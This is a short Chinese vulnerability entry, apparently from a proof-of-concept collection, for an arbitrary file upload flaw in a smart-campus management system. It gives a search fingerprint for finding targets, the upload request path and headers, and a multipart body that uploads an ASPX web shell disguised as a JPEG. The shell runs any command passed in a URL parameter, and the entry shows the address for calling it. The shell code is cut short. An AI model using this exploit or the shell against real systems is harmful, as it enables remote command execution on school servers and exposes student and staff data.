# 智慧校园安校易管理系统FileUpAd任意文件上传漏洞

- **系统**：智慧校园安校易管理系统FileUpAd　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`title="智慧综合管理平台登入"`
- **请求**：`POST /Module/FileUpPage/FileUpAd.aspx?file_tmid=upload HTTP/1.1`
- **关键头**：`X-Requested-With: XMLHttpRequest`　`Content-Type: multipart/form-data; boundary=----21909179191068471382830692…`

**请求体 / payload**
```
------21909179191068471382830692394
Content-Disposition: form-data; name="File"; filename="asd.aspx"
Content-Type: image/jpeg
<%@ Page Language="Jscript" validateRequest="false" %><%var c=new System.Diagnostics.ProcessStartInfo("cmd");var e=new System.Diagnostics.Process();var out:System.IO.StreamReader,EI:System.IO.StreamReader;c.UseShellExecute=false;c.RedirectStandardOutput=true;c.RedirectStandardError=true;e.StartInfo=c;c.Arguments="/c " + Request.Item["cmd"];e.Start();out=e.StandardOutput;EI=e.StandardError;e.Close();Response.Write(out.ReadToEnd() + EI.ReadToEnd());System.IO.File.Delete(R…（脚本共 676 字，完整版见原文）
```
- **预期**：200　|　http://ip/imgnews/imgad/000000/upload.aspx?cmd=whoami